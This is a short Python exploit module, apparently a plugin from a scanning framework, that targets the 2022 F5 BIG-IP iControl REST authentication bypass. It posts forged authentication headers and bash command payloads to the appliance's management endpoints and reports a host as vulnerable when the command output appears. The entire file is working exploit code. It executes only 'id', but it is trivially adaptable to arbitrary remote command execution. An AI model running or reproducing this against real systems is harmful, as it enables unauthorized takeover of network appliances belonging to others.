import requests
from core.printmodels import *

class F5_BigIP_RCE:
    def __init__(self):
        self.name = "F5 BIG-IP RCE"
        self.description = "F5 BIG-IP iControl REST Authentication Bypass RCE (2022)"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                'Host': 'localhost',
                'Authorization': 'Basic YWRtaW46',
                'Connection': 'keep-alive, x-F5-Auth-Token',
                'Content-Type': 'application/json',
                'X-F5-Auth-Token': 'DrDataYE'
            }

            payloads = [
                {
                    "command": "run",
                    "utilCmdArgs": "-c id"
                },
                {
                    "command": "create",
                    "name": "DrDataYE",
                    "partition": "Common",
                    "command": "bash",
                    "arguments": "-c 'id'"
                }
            ]

            endpoints = [
                f"{site}/mgmt/tm/util/bash",
                f"{site}/mgmt/tm/util/bash/",
                f"{site}/mgmt/shared/authn/login"
            ]

            for endpoint in endpoints:
                for payload in payloads:
                    response = requests.post(endpoint, headers=headers, json=payload, verify=False, timeout=10)
                    if response.status_code in [200, 201] and ("uid=" in response.text or "commandResult" in response.text):
                        return PrintSuccess(f"[F5-BIG-IP] Vulnerable! Successful at {endpoint}")

            return PrintFailed("[F5-BIG-IP] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[F5-BIG-IP] Error: {str(e)}")
